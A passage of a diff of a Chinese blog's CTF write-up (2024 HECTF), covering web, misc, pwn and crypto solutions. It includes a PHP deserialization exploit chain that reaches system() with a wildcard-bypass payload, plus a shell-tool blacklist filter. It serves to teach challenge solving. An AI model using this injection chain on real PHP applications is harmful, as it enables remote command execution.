+        if (!preg_match(&#39;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|;|date|bash|\$|\x00|`|env|\?|wget|\&quot;|\&#39;|\\\|php|id|whoami|=/i&#39;, $this-&gt;payload)) &#123;
+            system($this-&gt;payload.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);
+        &#125;else&#123;
+            die(&quot;fuck you Hacker&quot;);
+        &#125;
+    &#125;
+&#125;
+
+// 构造class00对象，用于触发__set方法
+$class00 = new class00();
+
+// 构造class01对象，使其cls属性指向class00对象
+$class01 = new class01();
+$class01-&gt;cls = $class00;
+
+
+// 构造class02对象，用于执行命令
+$class02 = new class02();
+$class02-&gt;payload = &quot;/bin/ca[t] /fla[g] #&quot;; // 假设flag文件存在且可读
+$class01-&gt;str3=$class02;
+// 构造User对象，使其msg属性包含class01对象，这样在__destruct方法中会触发class01的__tostring方法
+$user = new User(&quot;admin&quot;,&quot;admin&quot;);
+$user-&gt;msg = $class01;
+
+// 序列化User对象
+$serializedUser = serialize($user);
+
+// 发送POST请求，包含序列化的User对象
+echo ($serializedUser);
+?&gt;
+</code></pre>
 <p>然后改一下出来的，改成</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:5:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:5:&quot;admin&quot;;s:3:&quot;msg&quot;;O:7:&quot;class01&quot;:3:&#123;s:4:&quot;temp&quot;;i:0;s:4:&quot;str3&quot;;O:7:&quot;class02&quot;:1:&#123;s:7:&quot;payload&quot;;s:20:&quot;/bin/ca[t] /fla[g] #&quot;;&#125;s:3:&quot;cls&quot;;O:7:&quot;class00&quot;:0:&#123;&#125;&#125;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
+<pre><code>O:4:&quot;User&quot;:5:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:5:&quot;admin&quot;;s:3:&quot;msg&quot;;O:7:&quot;class01&quot;:3:&#123;s:4:&quot;temp&quot;;i:0;s:4:&quot;str3&quot;;O:7:&quot;class02&quot;:1:&#123;s:7:&quot;payload&quot;;s:20:&quot;/bin/ca[t] /fla[g] #&quot;;&#125;s:3:&quot;cls&quot;;O:7:&quot;class00&quot;:0:&#123;&#125;&#125;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;
+</code></pre>
 <p>最后base64编码一下交上去就行</p>
 <p><img src="/images/2024HECTF/image-20241208215732549.png" alt="image-20241208215732549"></p>
 <h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="快来反馈吧！！"><a href="#快来反馈吧！！" class="headerlink" title="快来反馈吧！！"></a>快来反馈吧！！</h2><p>填问卷就行。</p>
@@ -255,24 +538,71 @@
 <p>密码就在login那里，<img src="/images/2024HECTF/image-20241207171031664.png" alt="image-20241207171031664"></p>
 <p>登陆成功的密码是miscgod!（注意base64要去掉前三位后反转，这是分析前面的源码得到的）</p>
 <p>顺利解压拿到excel，改成zip后辍之后找到一个sheet1.xml体积过于巨大。打开之后一堆0和1，写一个脚本生成二维码。附上脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xml.etree.ElementTree <span class="keyword">as</span> ET</span><br><span class="line"><span class="keyword">import</span> qrcode</span><br><span class="line"></span><br><span class="line">tree = ET.parse(<span class="string">&#x27;sheet1.xml&#x27;</span>)</span><br><span class="line">root = tree.getroot()</span><br><span class="line"></span><br><span class="line">namespaces = &#123;</span><br><span class="line">    <span class="string">&#x27;main&#x27;</span>: <span class="string">&#x27;http://schemas.openxmlformats.org/spreadsheetml/2006/main&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">values = []</span><br><span class="line"><span class="keyword">for</span> cell <span class="keyword">in</span> root.findall(<span class="string">&#x27;.//main:c&#x27;</span>, namespaces):</span><br><span class="line">    value = cell.find(<span class="string">&#x27;main:v&#x27;</span>, namespaces)</span><br><span class="line">    <span class="keyword">if</span> value <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        values.append(value.text)</span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span>.join(values)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;提取的数据为：<span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> zlib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">MAX = <span class="number">200</span> </span><br><span class="line">pic = Image.new(<span class="string">&quot;RGB&quot;</span>,(MAX,MAX))</span><br><span class="line"><span class="built_in">str</span> =data</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,MAX):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,MAX):</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">str</span>[i] == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">            pic.putpixel([x,y],(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span>:pic.putpixel([x,y],(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">        i = i+<span class="number">1</span></span><br><span class="line">pic.show()</span><br><span class="line">pic.save(<span class="string">&quot;flag.png&quot;</span>)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">import xml.etree.ElementTree as ET
+import qrcode
 
+tree = ET.parse(&#39;sheet1.xml&#39;)
+root = tree.getroot()
+
+namespaces = &#123;
+    &#39;main&#39;: &#39;http://schemas.openxmlformats.org/spreadsheetml/2006/main&#39;
+&#125;
+
+values = []
+for cell in root.findall(&#39;.//main:c&#39;, namespaces):
+    value = cell.find(&#39;main:v&#39;, namespaces)
+    if value is not None:
+        values.append(value.text)
+
+data = &#39;&#39;.join(values)
+print(f&quot;提取的数据为：&#123;data&#125;&quot;)
+
+from PIL import Image
+from zlib import *
+
+MAX = 200 
+pic = Image.new(&quot;RGB&quot;,(MAX,MAX))
+str =data
+i=0
+for y in range(0,MAX):
+    for x in range(0,MAX):
+        if(str[i] == &#39;1&#39;):
+            pic.putpixel([x,y],(0,0,0))
+        else:pic.putpixel([x,y],(255,255,255))
+        i = i+1
+pic.show()
+pic.save(&quot;flag.png&quot;)
+</code></pre>
 <p><img src="/images/2024HECTF/flag.png" alt="flag"></p>
 <h2 id="funny"><a href="#funny" class="headerlink" title="funny"></a><strong>funny</strong></h2><p>发现图片关键词JK FUN。找到商场</p>
 <p><img src="/images/2024HECTF/fc95d64f5b7343e22d3104e2b431370.jpg" alt="fc95d64f5b7343e22d3104e2b431370"></p>
 <p>以商场周边的广场和水为线索，找到最终位置为</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HECTF&#123;北京市-西城区-西外文化休闲广场-京城水系慈禧水道&#125;</span><br></pre></td></tr></table></figure>
-
+<pre><code>HECTF&#123;北京市-西城区-西外文化休闲广场-京城水系慈禧水道&#125;
+</code></pre>
 <h2 id="2024HECTF俺来了！！！"><a href="#2024HECTF俺来了！！！" class="headerlink" title="2024HECTF俺来了！！！"></a><strong>2024HECTF俺来了！！！</strong></h2><p>关注公众号发消息</p>
 <h2 id="简单的压缩包"><a href="#简单的压缩包" class="headerlink" title="简单的压缩包"></a>简单的压缩包</h2><p>密码经过字典爆破：np76_</p>
 <p>一张图片，用foremost分离一下，拿到zip。</p>
 <p>写一个解密脚本解密。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">key, iv, encrypted_data</span>):</span><br><span class="line">    encrypted_data_bytes = binascii.a2b_hex(encrypted_data)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    decrypted_data = unpad(cipher.decrypt(encrypted_data_bytes), <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> decrypted_data</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;zip2.zip&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    encrypted_content = f.read()</span><br><span class="line">key = <span class="string">b&quot;abcdefghijklmnop&quot;</span></span><br><span class="line">iv = <span class="string">b&quot;qwertyuiopasdfgh&quot;</span></span><br><span class="line">decrypted_content = decrypt(key, iv, encrypted_content)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;decrypted_oringe.zip&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(decrypted_content)</span><br></pre></td></tr></table></figure>
-
+<pre><code class="python">from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad
+import binascii
+def decrypt(key, iv, encrypted_data):
+    encrypted_data_bytes = binascii.a2b_hex(encrypted_data)
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    decrypted_data = unpad(cipher.decrypt(encrypted_data_bytes), 16)
+    return decrypted_data
+with open(&quot;zip2.zip&quot;, &quot;rb&quot;) as f:
+    encrypted_content = f.read()
+key = b&quot;abcdefghijklmnop&quot;
+iv = b&quot;qwertyuiopasdfgh&quot;
+decrypted_content = decrypt(key, iv, encrypted_content)
+with open(&quot;decrypted_oringe.zip&quot;, &quot;wb&quot;) as f:
+    f.write(decrypted_content)
+</code></pre>
 <p>顺利拿到flag</p>
 <h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="sign-in"><a href="#sign-in" class="headerlink" title="sign in"></a><strong>sign in</strong></h2><p>IDA分析，发现第一次先随便输一个长度小于8的，第二次输入HECTF2024!，拿到shell，之后只需要</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag 1&gt;&amp;2</span><br></pre></td></tr></table></figure>
-
+<pre><code>cat flag 1&gt;&amp;2
+</code></pre>
 <p>把标准输出流写入到错误流里边，因为前边关闭了标准输出流</p>
 <h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="迷茫的艾米莉"><a href="#迷茫的艾米莉" class="headerlink" title="迷茫的艾米莉"></a>迷茫的艾米莉</h2><p>Y2w9Iobe_v_Ufbm0ajI05bfzvTP1b_c}{lr</p>
 <p>先是栅栏密码解密，栏目数为6</p>
@@ -280,456 +610,268 @@
 <p>然后是维吉尼亚密码，密钥responsibility</p>
 <p>HECTF{C0ng2at51ations_0n_comin9_in}</p>
 <h2 id="seven-more"><a href="#seven-more" class="headerlink" title="seven more"></a>seven more</h2><p>e与p-1，q-1不互素情况</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">e = <span class="number">1009</span> * <span class="number">7</span></span><br><span class="line">n = <span class="number">211174039496861685759253930135194075344490160159278597570478160714793843648384778026214533259531963057737358092962077790023796805017455012885781079402008604439036453706912819711606916173828620000813663524065796636039272173716362247511054616756763830945978879273812551204996912252317081836281439680223663883250992957309172746671265758427396929152878633033380299036765665530677963287445843653357154379447802151146728382517702550201</span></span><br><span class="line">c = <span class="number">191928992610587693825282781627928404831411364407297375816921425636703444790996279718679090695773598752804431891678976685083991392082287393228730341768083530729456781668626228660243400914135691435374881498580469432290771039798758412160073826112909167507868640830965603769520664582121780979767127925146139051005022993085473836213944491149411881673257628267851773377966008999511673741955131386600993547529438576918914852633139878066</span></span><br><span class="line">p = <span class="number">31160882390461311665815471693453819123352546432384109928704874241292707178454748381602275005604671000436222741183159072136366212086549437801626015758789167455043851748560416003501637268653712148286072544482747238223</span></span><br><span class="line">q = <span class="number">6776895366785389188349778634427547683984792095011326393872759455291221057085426285502176493658280343252730331506803173791893339840460125807960788857396637337440004750209164671124188980183308151635629356496128717687</span></span><br><span class="line"></span><br><span class="line">enc = c</span><br><span class="line">N = p*q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_oneroot</span>(<span class="params">p, e</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        Zp = Zmod(p)</span><br><span class="line">        g = Zp.random_element()</span><br><span class="line">        g = g ^ ((p-<span class="number">1</span>) // e)</span><br><span class="line">        <span class="keyword">for</span> mult <span class="keyword">in</span> divisors(e):</span><br><span class="line">            <span class="keyword">if</span> (mult != e):</span><br><span class="line">                g2 = g ^ mult</span><br><span class="line">                <span class="keyword">if</span> (g2 == <span class="number">1</span>):</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> g</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">p, c, e</span>):</span><br><span class="line">    w = gcd(e, p-<span class="number">1</span>)</span><br><span class="line">    e1, p1 = e // w, (p-<span class="number">1</span>) // w</span><br><span class="line">    d = inverse_mod(e1, p1)</span><br><span class="line">    c1 = <span class="built_in">pow</span>(c, d, p)</span><br><span class="line">    g, a, b = xgcd(p1, w)</span><br><span class="line">    g = get_oneroot(p, w)</span><br><span class="line">    m = <span class="built_in">pow</span>(c1, b, p)</span><br><span class="line">    <span class="keyword">return</span> [ZZ(m * g ^ i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(w)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mp_list = decrypt(p, enc, e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Find root p OK&#x27;</span>)</span><br><span class="line">mq_list = decrypt(q, enc, e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Find root q OK&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> mp, mq <span class="keyword">in</span> itertools.product(mp_list, mq_list):</span><br><span class="line">    m = crt([mp, mq], [p, q])</span><br><span class="line">    msg = long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">b&#x27;HECTF&#x27;</span> <span class="keyword">in</span> msg):</span><br><span class="line">        <span class="built_in">print</span>(msg)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">import libnum
+from Crypto.Util.number import *
+import itertools
+e = 1009 * 7
+n = 211174039496861685759253930135194075344490160159278597570478160714793843648384778026214533259531963057737358092962077790023796805017455012885781079402008604439036453706912819711606916173828620000813663524065796636039272173716362247511054616756763830945978879273812551204996912252317081836281439680223663883250992957309172746671265758427396929152878633033380299036765665530677963287445843653357154379447802151146728382517702550201
+c = 191928992610587693825282781627928404831411364407297375816921425636703444790996279718679090695773598752804431891678976685083991392082287393228730341768083530729456781668626228660243400914135691435374881498580469432290771039798758412160073826112909167507868640830965603769520664582121780979767127925146139051005022993085473836213944491149411881673257628267851773377966008999511673741955131386600993547529438576918914852633139878066
+p = 31160882390461311665815471693453819123352546432384109928704874241292707178454748381602275005604671000436222741183159072136366212086549437801626015758789167455043851748560416003501637268653712148286072544482747238223
+q = 6776895366785389188349778634427547683984792095011326393872759455291221057085426285502176493658280343252730331506803173791893339840460125807960788857396637337440004750209164671124188980183308151635629356496128717687
 
+enc = c
+N = p*q
+
+
+def get_oneroot(p, e):
+    while True:
+        Zp = Zmod(p)
+        g = Zp.random_element()
+        g = g ^ ((p-1) // e)
+        for mult in divisors(e):
+            if (mult != e):
+                g2 = g ^ mult
+                if (g2 == 1):
+                    break
+        else:
+            return g
+
+
+def decrypt(p, c, e):
+    w = gcd(e, p-1)
+    e1, p1 = e // w, (p-1) // w
+    d = inverse_mod(e1, p1)
+    c1 = pow(c, d, p)
+    g, a, b = xgcd(p1, w)
+    g = get_oneroot(p, w)
+    m = pow(c1, b, p)
+    return [ZZ(m * g ^ i) for i in range(w)]
+
+
+mp_list = decrypt(p, enc, e)
+print(&#39;Find root p OK&#39;)
+mq_list = decrypt(q, enc, e)
+print(&#39;Find root q OK&#39;)
+for mp, mq in itertools.product(mp_list, mq_list):
+    m = crt([mp, mq], [p, q])
+    msg = long_to_bytes(int(m))
+    if (b&#39;HECTF&#39; in msg):
+        print(msg)
+</code></pre>
 <h2 id="翻一翻"><a href="#翻一翻" class="headerlink" title="翻一翻"></a>翻一翻</h2><p><a target="_blank" rel="noopener" href="https://kt.gy/blog/2015/10/asis-2015-finals-rsasr/%EF%BC%8C%E6%94%B9%E4%B8%80%E4%B8%8Bpython3%E3%80%82">https://kt.gy/blog/2015/10/asis-2015-finals-rsasr/，改一下python3。</a></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, inverse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">sys.setrecursionlimit(<span class="number">1500</span>)</span><br><span class="line"></span><br><span class="line">n = <span class="number">404647938065363927581436797059920217726808592032894907516792959730610309231807721432452916075249512425255272010683662156287639951458857927130814934886426437345595825614662468173297926187946521587383884561536234303887166938763945988155320294755695229129209227291017751192918550531251138235455644646249817136993</span></span><br><span class="line">c = <span class="number">365683379886722889532600303686680978443674067781851827634350197114193449886360409198931986483197030101273917834823409997256928872225094802167525677723275059148476025160768252077264285289388640035034637732158021710365512158554924957332812612377993122491979204310133332259340515767896224408367368108253503373778</span></span><br><span class="line">e = <span class="number">65537</span>  <span class="comment"># 公钥指数</span></span><br><span class="line"><span class="comment"># n = 6528060431134312098979986223024580864611046696815854430382374273411300418237131352745191078493977589108885811759425485490763751348287769344905469074809576433677010568815441304709680418296164156409562517530459274464091661561004894449297362571476259873657346997681362092440259333170797190642839587892066761627543</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">t</span>(<span class="params">a, b, k</span>):</span><br><span class="line">    <span class="comment"># sqrt(n) has 155 digits, so we need to figure out 77 digits on each side</span></span><br><span class="line">    <span class="keyword">if</span> k == <span class="number">77</span>:</span><br><span class="line">        <span class="keyword">if</span> a * b == n:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;找到素数对:&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;a = <span class="subst">&#123;a&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;b = <span class="subst">&#123;b&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            <span class="comment"># We try to guess the last not-already-guessed digits of both primes</span></span><br><span class="line">            a1 = a + i * (<span class="number">10</span> ** k) + j * (<span class="number">10</span> ** (<span class="number">154</span> - k))</span><br><span class="line">            b1 = b + j * (<span class="number">10</span> ** k) + i * (<span class="number">10</span> ** (<span class="number">154</span> - k))</span><br><span class="line">            <span class="keyword">if</span> a1 * b1 &gt; n:</span><br><span class="line">                <span class="comment"># a1 and b1 are too large</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> (a1 + (<span class="number">10</span> ** (<span class="number">154</span> - k))) * (b1 + (<span class="number">10</span> ** (<span class="number">154</span> - k))) &lt; n:</span><br><span class="line">                <span class="comment"># a1 and b1 are too small</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> (a1 * b1) % (<span class="number">10</span> ** (k + <span class="number">1</span>)) != n % (<span class="number">10</span> ** (k + <span class="number">1</span>)):</span><br><span class="line">                <span class="comment"># The last digits of a1 * b1 (which won&#x27;t change later) doesn&#x27;t match n</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># this a1 and b1 seem to be a possible match, try to guess remaining digits</span></span><br><span class="line">            t(a1, b1, k + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># The primes have an odd number of digits (155), so we try all possible middle digits</span></span><br><span class="line"><span class="comment"># (it simplifies the code)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    t(i * (<span class="number">10</span> ** <span class="number">77</span>), i * (<span class="number">10</span> ** <span class="number">77</span>), <span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre><code class="python">from Crypto.Util.number import long_to_bytes, inverse
+import sys
 
+sys.setrecursionlimit(1500)
+
+n = 404647938065363927581436797059920217726808592032894907516792959730610309231807721432452916075249512425255272010683662156287639951458857927130814934886426437345595825614662468173297926187946521587383884561536234303887166938763945988155320294755695229129209227291017751192918550531251138235455644646249817136993
+c = 365683379886722889532600303686680978443674067781851827634350197114193449886360409198931986483197030101273917834823409997256928872225094802167525677723275059148476025160768252077264285289388640035034637732158021710365512158554924957332812612377993122491979204310133332259340515767896224408367368108253503373778
+e = 65537  # 公钥指数
+# n = 6528060431134312098979986223024580864611046696815854430382374273411300418237131352745191078493977589108885811759425485490763751348287769344905469074809576433677010568815441304709680418296164156409562517530459274464091661561004894449297362571476259873657346997681362092440259333170797190642839587892066761627543
+
+
+def t(a, b, k):
+    # sqrt(n) has 155 digits, so we need to figure out 77 digits on each side
+    if k == 77:
+        if a * b == n:
+            print(&quot;找到素数对:&quot;)
+            print(f&quot;a = &#123;a&#125;&quot;)
+            print(f&quot;b = &#123;b&#125;&quot;)
+            return
+    for i in range(10):
+        for j in range(10):
+            # We try to guess the last not-already-guessed digits of both primes
+            a1 = a + i * (10 ** k) + j * (10 ** (154 - k))
+            b1 = b + j * (10 ** k) + i * (10 ** (154 - k))
+            if a1 * b1 &gt; n:
+                # a1 and b1 are too large
+                continue
+            if (a1 + (10 ** (154 - k))) * (b1 + (10 ** (154 - k))) &lt; n:
+                # a1 and b1 are too small
+                continue
+            if (a1 * b1) % (10 ** (k + 1)) != n % (10 ** (k + 1)):
+                # The last digits of a1 * b1 (which won&#39;t change later) doesn&#39;t match n
+                continue
+            # this a1 and b1 seem to be a possible match, try to guess remaining digits
+            t(a1, b1, k + 1)
+
+
+# The primes have an odd number of digits (155), so we try all possible middle digits
+# (it simplifies the code)
+for i in range(10):
+    t(i * (10 ** 77), i * (10 ** 77), 0)
+</code></pre>
 <p>后续正常rsa解密即可。</p>
 
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/07/IDA%E4%BD%BF%E7%94%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="songhahaha">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="songhahaha的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/11/07/IDA%E4%BD%BF%E7%94%A8/" class="post-title-link" itemprop="url">IDA快捷键</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2024-11-07 22:31:00 / 修改时间：22:36:53" itemprop="dateCreated datePublished" datetime="2024-11-07T22:31:00+08:00">2024-11-07</time>
-            </span>
-
-          
-
+            
         </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>shift+E可以提取数组数据</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2024/11/07/IDA%E4%BD%BF%E7%94%A8/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
+    </div>
+    <div class="post-tags">
         
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/07/reverse%E9%A2%98%E7%9B%AE/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="songhahaha">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="songhahaha的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/11/07/reverse%E9%A2%98%E7%9B%AE/" class="post-title-link" itemprop="url">一些题目和踩坑记录</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2024-11-07 22:30:59" itemprop="dateCreated datePublished" datetime="2024-11-07T22:30:59+08:00">2024-11-07</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
